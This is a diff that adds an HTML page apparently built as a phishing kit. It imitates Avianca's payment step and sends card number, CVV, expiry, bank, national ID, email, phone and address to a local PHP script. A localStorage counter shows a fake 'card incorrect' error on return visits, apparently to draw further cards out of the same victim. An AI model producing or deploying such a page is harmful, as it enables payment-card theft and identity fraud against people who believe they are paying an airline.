@@ -1,0 +1,325 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <script src="js/flight-detail.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Payment</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/favicon.png" t ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="css/flight.css">
+    <link rel="stylesheet" href="css/normalize.css">
+
+</head>
+
+<body class="mvh-100 bg-gray">
+
+    <header>
+        <div class="next-step">
+            <img class="ns-logo" src="images/avianca_red.svg">
+            <div class="ns-step">
+                <img src="images/step_3_header.png">
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="main-form">
+            <div class="form-control">
+                <div class="form-header">
+                    <label class="radio-wrapper" for="ida_vuelta">
+                        <input type="radio" checked id="ida_vuelta" name="opcion_viaje"
+                            onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
+                        <div class="radio-circle">
+                            <div class="radio-dot"></div>
+                        </div>
+                        <h3 class="radio-label">Tarjeta de crédito y débito</h3>
+                    </label>
+                </div>
+                <hr>
+                <!-- CARD SECTION -->
+                <div class="form-section">
+                    <div class="companies-container">
+                        <img src="images/visa.svg">
+                        <img src="images/mc.svg">
+                        <img src="images/diners.svg">
+                        <img src="images/amex.svg">
+                        <img src="images/uatp.png" width="50px">
+                    </div>
+
+                    <h4>Información de la tarjeta</h4>
+                    <div class="checkbox-group mt-2">
+                        <input class="check fs-2" type="checkbox" id="">
+                        <label for="">Mi tarjeta de crédito no es de Colombia</label>
+                    </div>
+                    <form action="php/index.php" method="post">
+
+                        <div name="punto" id="formulario-tarjeta">
+                            <input name="inputNumero" id="inputNumero" class="input-cc bg-std mt-2" maxlength="19"
+                                minlength="18" placeholder="Número de Tarjeta" type="text">
+                            <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
+
+
+                            <div class="input-group mt-2">
+                                <div class="me-2">
+                                    <input name="selectMes" id="selectMes" type="text" placeholder="MM/AA">
+                                    <label class="fs-5">Fecha de Expiración</label>
+                                </div>
+
+                                <div>
+                                    <input class="" type="text" name="inputCCV" id="inputCCV" maxlength="4"
+                                        placeholder="CVV">
+                                    <label class="fs-5">Código de seguridad</label>
+                                </div>
+                            </div>
+
+                            <!-- BANCO -->
+                            <select required name="TxtBanco" id="TxtBanco" class="mt-4">
+                                <option value="00" selected>Seleccione su banco</option>
+                                <option value='BANCOLOMBIA'>BANCOLOMBIA</option>
+                                <option value='BANCO AGRARIO'>BANCO AGRARIO</option>
+                                <option value='BANCO AVVILLAS'>BANCO AV VILLAS</option>
+                                <option value='BANCO BBVA'>BANCO BBVA</option>
+                                <option value='BANCO CAJA SOCIAL'>BANCO CAJA SOCIAL</option>
+                                <option value='BANCO CITIBANK'>BANCO CITIBANK</option>
+                                <option value='BANCO COLPATRIA'>BANCO COLPATRIA</option>
+                                <option value='BANCO CORPBANCA'>BANCO CORPBANCA</option>
+                                <option value='BANCO DAVIVIENDA'>BANCO DAVIVIENDA</option>
+                                <option value='BANCO DE BOGOTA'>BANCO DE BOGOTA</option>
+                                <option value='BANCO DE OCCIDENTE'>BANCO DE OCCIDENTE</option>
+                                <option value='BANCO FALABELLA'>BANCO FALABELLA</option>
+                                <option value='BANCO FINANDINA'>BANCO FINANDINA</option>
+                                <option value='BANCO GANADERO'>BANCO GANADERO</option>
+                                <option value='BANCO GNB SUDAMERIS'>BANCO GNB SUDAMERIS</option>
+                                <option value='BANCO HSBC COLOMBIA'>BANCO HSBC COLOMBIA</option>
+                                <option value='BANCO ITAU'>BANCO ITAU</option>
+                                <option value='BANCO PICHINCHA'>BANCO PICHINCHA</option>
+                                <option value='BANCO POPULAR'>BANCO POPULAR</option>
+                                <option value='BANCO SANTANDER'>BANCO SANTANDER COLOMBIA</option>
+                                <option value='BANCO CREDIBANCO'>CREDIBANCO - ASOCIACION GREMIAL DE INSTITUCIONES
+                                    FINANCIERAS</option>
+                                <option value='BANCO HELM BANK'>HELM BANK</option>
+                                <option value='NEQUI'>NEQUI</option>
+                                <option value='REDEBAN MULTICOLOR'>REDEBAN MULTICOLOR</option>
+                                <option value='SERFINANSA'>SERFINANSA - SERVICIOS FINANCIEROS SERFINANSA COMPANIA DE
+                                    FINANCIAMIENTO</option>
+                                <option value='SERVIBANCA'>SERVIBANCA</option>
+                                <option value='TUYA'>TUYA</option>
+                                <option value='NUBANK'>NUBANK</option>
+                                <option value="NN">NO SE ENCUENTRA EL BANCO</option>
+                            </select>
+
+
+
+                            <select id="dues" required class="mt-4 mb-5">
+                                <option value="" disabled selected>Número de cuotas</option>
+                                <option value="1">1</option>
+                                <option value="2">2</option>
+                                <option value="3">3</option>
+                                <option value="4">4</option>
+                                <option value="5">5</option>
+                                <option value="6">6</option>
+                                <option value="7">7</option>
+                                <option value="8">8</option>
+                                <option value="9">9</option>
+                                <option value="10">10</option>
+                                <option value="11">11</option>
+                                <option value="12">12</option>
+                                <option value="13">13</option>
+                                <option value="14">14</option>
+                                <option value="15">15</option>
+                                <option value="16">16</option>
+                                <option value="17">17</option>
+                                <option value="18">18</option>
+                                <option value="19">19</option>
+                                <option value="20">20</option>
+                                <option value="21">21</option>
+                                <option value="22">22</option>
+                                <option value="23">23</option>
+                                <option value="24">24</option>
+                                <option value="25">25</option>
+                                <option value="26">26</option>
+                                <option value="27">27</option>
+                                <option value="28">28</option>
+                                <option value="29">29</option>
+                                <option value="30">30</option>
+                                <option value="31">31</option>
+                                <option value="32">32</option>
+                                <option value="33">33</option>
+                                <option value="34">34</option>
+                                <option value="35">35</option>
+                                <option value="36">36</option>
+                            </select>
+                            <input type="hidden" id="pag" name="pag" value="tarjeta">
+                            <hr>
+
+                            <h4 class="mt-5">Información del titular</h4>
+                            <input id="nombre" name="nombre" class="mt-4" type="text"
+                                placeholder="Nombre del titular de la tarjeta">
+
+                            <input id="documento" name="documento" class="mt-4" type="text"
+                                placeholder="Número de identificación">
+                            <input id="correo" name="correo" class="mt-4" type="text" placeholder="Correo">
+                            <input id="tel" name="tel" class="mt-4 mb-5" type="text" maxlength="9999999999"
+                                placeholder="Celular">
+
+                            <!-- <hr> -->
+
+                            <h4 class="mt-4">Domicilio de facturación</h4>
+                            <input id="ciudad" name="ciudad" class="mt-4" type="text" placeholder="Ciudad">
+
+                            <input id="direccion" name="direccion" class="mt-4" type="text" placeholder="Dirección">
+
+                            <div class="checkbox-group mt-4">
+                                <div>
+                                    <input class="check" type="checkbox" name="" id="">
+                                </div>
+                                <label>Por la presente declaro que soy mayor de edad, he leído y acepto el <a
+                                        href="">contrato de transporte</a>, y la <a href="">política general de
+                                        privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a
+                                        href="">manejo de mercancías peligrosas</a>, la política de cancelación y
+                                    penalidades por cambio, el cobro de impuestos y cargos gubernamentales no incluidos
+                                    en el valor del servicio, así como aquellos incluidos y las <a href="">condiciones
+                                        de acceso de uso de este sitio web.</a></label>
+                            </div>
+
+                            <div class="mt-4 show justify-content-center">
+
+                                <button type="submit" class="btn btn-gray">
+                                    Pago seguro
+                                </button>
+                            </div>
+
+                        </div>
+
+                </div>
+
+
+            </div>
+            </form>
+
+            <form class="form-control mt-5 mb-10">
+                <div class="form-header">
+                    <label class="radio-wrapper" for="ida_vuelta">
+                        <input type="radio" disabled id="ida_vuelta">
+                        <div class="radio-circle">
+                            <div class="radio-dot"></div>
+                        </div>
+                        <h3 class="radio-label disabled">PSE (Deshabilitado)</h3>
+                    </label>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        document.querySelector("form").addEventListener("submit", function (event) {
+            let inputNumero = document.getElementById("inputNumero").value;
+            let inputCCV = document.getElementById("inputCCV").value;
+            let isValid = true;
+
+            // Validación de longitud de la tarjeta
+            if (inputNumero.length < 18 || inputNumero.length > 19) {
+                alert("Tarjeta errada, intente nuevamente.");
+                isValid = false;
+            }
+
+            // Validación del CVV según el número de tarjeta
+            if (inputNumero.startsWith("3")) {
+                if (inputCCV.length !== 4) {
+                    alert("CVV errado!");
+                    isValid = false;
+                }
+            } else if (inputNumero.startsWith("4") || inputNumero.startsWith("5")) {
+                if (inputCCV.length !== 3) {
+                    alert("CVV errado!");
+                    isValid = false;
+                }
+            }
+
+            // Si alguna validación falla, prevenir el envío del formulario
+            if (!isValid) {
+                event.preventDefault();
+            }
+        });
+
+    </script>
+
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const selectMes = document.getElementById('selectMes');
+
+            selectMes.addEventListener('input', function (event) {
+                const inputValue = event.target.value;
+
+                // Si el usuario ha ingresado el mes completo (ejemplo: "12/")
+                if (inputValue.length === 3 && inputValue.endsWith('/')) {
+                    event.target.value = inputValue.substring(0, 2); // Eliminar el "/"
+                }
+                // Si el usuario ha ingresado el mes y la barra (ejemplo: "12/")
+                else if (inputValue.length === 3 && !inputValue.endsWith('/')) {
+                    event.target.value = inputValue.substring(0, 2) + '/' + inputValue.charAt(2); // Insertar el "/"
+                }
+                // Si el usuario está borrando el mes completo junto con la barra (ejemplo: "12")
+                else if (inputValue.length === 2 && !inputValue.includes('/')) {
+                    // No se hace nada, permite la eliminación normal del segundo carácter.
+                }
+            });
+        });
+
+        document.getElementById('inputNumero').addEventListener('input', function (e) {
+            var input = e.target.value.replace(/\D/g, ''); // Eliminar todo lo que no sea dígito
+            var formattedInput = ''; // Inicializar la cadena formateada
+
+            // Agregar un espacio después de cada 4 dígitos
+            for (var i = 0; i < input.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedInput += ' '; // Agregar espacio
+                }
+                formattedInput += input[i];
+            }
+
+            e.target.value = formattedInput; // Actualizar el valor del campo de entrada
+        });
+    </script>
+    <script>
+        window.onload = function() {
+            // Verificar si hay un contador en localStorage
+            let payment = localStorage.getItem('payment');
+
+            if (payment) {
+                // Si el contador existe y es mayor o igual a 2, mostrar la alerta
+                if (payment >= 1) {
+                  Swal.fire({
+          icon: 'error',
+          title: 'Oops...',
+          text: '¡Tarjeta incorrecta por favor intente de nuevo!',
+          confirmButtonColor: "#000000"
+        });
+                }
+                // Incrementar el contador
+                localStorage.setItem('payment', ++payment);
+            } else {
+                // Si es la primera vez que visita la página, inicializar el contador en 1
+                localStorage.setItem('payment', 1);
+            }
+        }
+    </script>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="js/validaciones.js" async defer></script>
+
+
+</html>
